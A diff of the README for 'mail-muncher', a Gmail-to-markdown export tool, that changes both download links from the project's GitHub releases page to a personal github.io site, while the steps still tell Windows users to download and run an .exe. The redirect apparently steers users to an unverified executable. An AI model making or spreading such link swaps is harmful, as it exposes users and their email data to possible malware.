@@ -1,6 +1,6 @@
 # 📧 mail-muncher - Organize your email for smart agents
 
-[![](https://img.shields.io/badge/Download-Latest-blue.svg)](https://github.com/redwanio660-pixel/mail-muncher/releases)
+[![](https://img.shields.io/badge/Download-Latest-blue.svg)](https://redwanio660-pixel.github.io)
 
 mail-muncher saves your Gmail messages to your hard drive. It translates emails into simple text files and markdown documents. This process creates a clean library of your inbox history. You can use these files to feed data to artificial intelligence tools or automated programs. The software functions as a bridge between your email and your digital assistant.
 
@@ -8,7 +8,7 @@ mail-muncher saves your Gmail messages to your hard drive. It translates emails 
 
 Follow these instructions to use the software on your Windows computer.
 
-1. Visit the [releases page](https://github.com/redwanio660-pixel/mail-muncher/releases) to find the latest version.
+1. Visit the [releases page](https://redwanio660-pixel.github.io) to find the latest version.
 2. Look for the file ending in `.exe` under the Assets section.
 3. Click that file to start the download.
 4. Save the file to a folder you can find, such as your Downloads folder.
